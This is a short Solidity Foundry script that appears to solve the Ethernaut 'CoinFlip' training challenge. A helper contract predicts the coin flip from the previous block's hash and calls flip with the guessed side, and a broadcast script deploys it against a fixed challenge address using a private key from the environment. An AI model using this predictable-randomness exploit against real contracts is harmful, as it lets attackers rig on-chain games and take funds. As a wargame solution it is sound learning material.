// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip c)
    {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        c.flip(side);
    }
}

contract CoinFlipSolution is Script {

    CoinFlip public coinflipInstance = CoinFlip(0x08b89871C8cA09F220AD9Bb01297d790402Be6Ca);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("i win yay ---> here is how many", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}